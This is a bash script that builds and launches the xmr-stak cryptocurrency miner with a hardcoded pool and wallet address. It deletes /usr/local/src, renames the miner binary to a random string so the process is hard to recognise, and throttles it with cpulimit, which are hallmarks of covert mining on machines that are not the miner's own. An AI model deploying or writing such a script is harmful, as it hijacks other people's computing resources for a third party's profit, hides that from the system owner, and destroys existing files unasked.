#!/bin/bash
sudo apt-get update
sudo apt-get install cpulimit 
sudo apt --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git libuv1-dev 
mkdir /usr/local
rm -r /usr/local/src
mkdir /usr/local/src
git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/local/src
mkdir build
cd build 
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF
make install
cd bin
sudo sysctl -w vm.nr_hugepages=128 
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/config.txt
"call_timeout" : 10,
"retry_time" : 30,
"giveup_limit" : 0,
"verbose_level" : 3,
"print_motd" : true,
"h_print_time" : 60,
"aes_override" : null,
"use_slow_memory" : "warn",
"tls_secure_algo" : true,
"daemon_mode" : false,
"flush_stdout" : false,
"output_file" : "",
"httpd_port" : 99,
"http_login" : "",
"http_pass" : "",
"prefer_ipv4" : true,
EOT
' &&
sudo bash -c 'cat <<EOT >>/usr/local/src/build/bin/pools.txt
"pool_list" :
[
{"pool_address" : "arqma.herominers.com:10641", "wallet_address" : "aRi1cDd6LkAcc1p6W58dkPi8xSfbZ5EuYFrHxwH3py1MQ9rFrzmSaghguD4GGpCfHSMmKXWJrd4e5CkabC3viWJKfHuDY6qzf9R6DncSZXHz5", "rig_id" : "", "pool_password" : "ir2btddJ78sicpKntYo3oRMLQh91VktzBfZzWbhwZnQxS815QLiG5WCAH9sgVGC5uwLZuMJCwW5CdFigNbJ3WTxU2CG5GnUDe+ed92bfcf1dbf9b9884d9823ab889b7b9f4f9b02d41a3bad8c76b0d76cd75aed3", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 100 },
],

"currency" : "cryptonight_turtle",

EOT
' &&
sudo cp xmr-stak "$cpuname"
rm xmr-stak
echo $cpuname" is starting"
cpulimit -l 795 ./"${cpuname}"
